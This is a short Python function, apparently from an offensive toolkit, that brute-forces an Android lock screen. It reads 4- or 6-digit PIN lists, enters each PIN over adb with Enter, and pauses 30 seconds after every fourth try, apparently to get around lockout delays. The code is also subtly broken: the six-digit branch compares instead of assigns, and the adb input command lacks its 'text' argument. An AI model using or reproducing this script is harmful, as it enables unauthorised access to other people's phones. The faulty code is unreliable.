def bypass(flag):
    if flag == 4:
        length = "four.txt"
    elif flag == 6:
        length == "six.txt"
    with open(f'fsociety/assets/{length}', 'r') as file:
        numbers = file.read().splitlines()
    
    for i, number in enumerate(numbers):
        if i % 4 == 0 and i != 0:
            time.sleep(30)
        command = f"adb shell input {number} && adb shell input keyevent 66"
        subprocess.run(command, shell=True)

